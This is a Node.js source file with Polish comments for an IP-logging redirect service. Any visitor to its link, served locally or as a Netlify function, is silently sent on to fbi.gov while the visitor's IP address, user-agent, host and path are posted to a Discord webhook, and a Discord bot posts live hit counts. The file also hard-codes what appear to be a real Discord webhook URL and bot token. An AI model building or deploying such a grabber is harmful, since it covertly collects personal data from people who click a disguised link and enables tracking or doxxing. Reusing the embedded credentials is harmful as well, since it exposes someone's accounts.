const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const https = require('https');
const http = require('http');
const { URL } = require('url');

// ===== KONFIGURACJA =====
const REDIRECT_URL = 'https://www.fbi.gov/';
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
const BOT_TOKEN = 'MTQ3NjAwMzcwODEwNTEzNDExMA.G2OIul.3fVojuSqE55cRm4ymZa81031nr_TZDIrxHUBPo';
const PREFIX = '.';
const PORT = process.env.PORT || 80;
// ========================

let totalRedirectHits = 0;
let activeStatsMessage = null;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// ─── Funkcja: Edycja wiadomości bota ──────────────────────────────────────────
async function updateBotStats() {
    if (!activeStatsMessage) return;
    const embed = new EmbedBuilder()
        .setTitle('📊 STATYSTYKI REDIRECTA — NA ŻYWO')
        .setColor(0x5865F2)
        .addFields(
            { name: '🔗 Cel', value: `\`${REDIRECT_URL}\``, inline: false },
            { name: '📊 Łącznie wejść', value: `\`${totalRedirectHits}\``, inline: true },
            { name: '🟢 Status', value: '`Nasłuchiwanie...`', inline: true }
        )
        .setTimestamp();
    try { await activeStatsMessage.edit({ content: '', embeds: [embed] }); } catch (e) { activeStatsMessage = null; }
}

// ─── Funkcja: Pełny Webhook Logger ───────────────────────────────────────────
function sendFullWebhook({ ip, method, path, userAgent, host, platform }) {
    const body = JSON.stringify({
        embeds: [{
            title: `🌐 Nowe wejście (${platform})`,
            color: 0x57F287,
            fields: [
                { name: '🖥️ IP', value: `\`${ip || 'brak'}\``, inline: true },
                { name: '📄 Ścieżka', value: `\`${path || '/'}\``, inline: true },
                { name: '📬 Metoda', value: `\`${method || 'GET'}\``, inline: true },
                { name: '📈 Licznik', value: `\`${totalRedirectHits}\``, inline: true },
                { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
                { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 250)}\``, inline: false },
            ],
            timestamp: new Date().toISOString()
        }]
    });

    const url = new URL(WEBHOOK_URL);
    const req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => { if (res.statusCode !== 204) console.warn('Błąd Webhooka:', res.statusCode); });

    req.on('error', (e) => console.error('Webhook Error:', e.message));
    req.write(body);
    req.end();
}

// ─── Serwer lokalny: Obsługa requestu ─────────────────────────────────────────
async function handleLocalRequest(req) {
    totalRedirectHits++;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    // 1. Edytuj wiadomość bota
    updateBotStats();

    // 2. Poślij pełny webhook
    sendFullWebhook({
        ip,
        method: req.method,
        path: req.url,
        userAgent: req.headers['user-agent'],
        host: req.headers['host'],
        platform: 'Lokalnie'
    });
}

// ─── Discord Bot Komendy ─────────────────────────────────────────────────────
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const command = message.content.slice(PREFIX.length).trim().split(/\s+/)[0].toLowerCase();

    if (command === 'start') {
        totalRedirectHits = 0;
        activeStatsMessage = await message.channel.send('🚀 Rozpoczynam monitorowanie...');
        updateBotStats();
        await message.delete().catch(() => { });
    }

    if (command === 'stop') {
        if (activeStatsMessage) {
            await activeStatsMessage.edit({ content: '🛑 Zatrzymano.', embeds: [] });
            activeStatsMessage = null;
        }
    }
});

// ─── NETLIFY (Serverless) ────────────────────────────────────────────────────
exports.handler = async (event) => {
    totalRedirectHits++;
    const ip = event.headers['x-forwarded-for']?.split(',')[0] || event.headers['x-nf-client-connection-ip'] || 'brak';

    // Webhook na Netlify
    sendFullWebhook({
        ip,
        method: event.httpMethod,
        path: event.path,
        userAgent: event.headers['user-agent'],
        host: event.headers['host'],
        platform: 'Netlify'
    });

    return {
        statusCode: 302,
        headers: { 'Location': REDIRECT_URL, 'Cache-Control': 'no-store' },
        body: ''
    };
};

// ─── LOKALNY START ──────────────────────────────────────────────────────────
if (require.main === module) {
    if (process.env.NETLIFY) process.exit(0);

    http.createServer((req, res) => {
        res.writeHead(302, { 'Location': REDIRECT_URL, 'Cache-Control': 'no-store' });
        res.end();
        handleLocalRequest(req);
    }).listen(PORT, '0.0.0.0', () => console.log(`✅ Serwer na porcie ${PORT}`));

    client.login(BOT_TOKEN).catch(e => console.error('❌ Błąd bota:', e.message));
}
